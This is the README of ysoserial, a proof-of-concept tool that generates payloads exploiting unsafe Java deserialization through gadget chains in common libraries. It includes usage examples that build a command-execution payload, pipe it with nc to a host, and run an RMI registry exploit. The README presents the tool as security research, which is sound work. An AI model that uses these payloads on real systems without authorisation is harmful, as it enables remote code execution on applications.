
# ysoserial 

[![Join the chat at https://gitter.im/frohoff/ysoserial](https://badges.gitter.im/frohoff/ysoserial.svg)](https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) [![Download Latest Snapshot](https://img.shields.io/badge/download-master--SNAPSHOT-green.svg)](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![](https://github.com/frohoff/ysoserial/blob/master/ysoserial.png)

## Description

Released as part of AppSecCali 2015 Talk ["Marshalling Pickles: how deserializing objects will ruin your day"](http://frohoff.github.io/appseccali-marshalling-pickles/) with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x). 
Later updated to include additional gadget chains for [JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and [Apache Commons Beanutils](https://gist.github.com/frohoff/9eb8811761ff989b3ac0).

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java 
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of objects. 
The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers 
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$ java -jar target/ysoserial-0.0.4-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
        Available payload types:
                BeanShell1 [org.beanshell:bsh:2.0b5]
                CommonsBeanutilsCollectionsLogging1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
                CommonsCollections1 [commons-collections:commons-collections:3.1]
                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
                CommonsCollections3 [commons-collections:commons-collections:3.1]
                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
                Groovy1 [org.codehaus.groovy:groovy:2.3.9]
                Jdk7u21 []
                Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
```

## Examples

```shell
$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:
       
$ java -jar ysoserial-0.0.4-all.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 < groovypayload.bin

$ java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

1. Download the latest jar from [JitPack](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar) [![Download Latest Snapshot](https://img.shields.io/badge/download-master--SNAPSHOT-green.svg)](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar) .

Note that GitHub-hosted releases were removed in compliance with the [GitHub Community Guidelines](https://help.github.com/articles/github-community-guidelines/#what-is-not-allowed)

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request
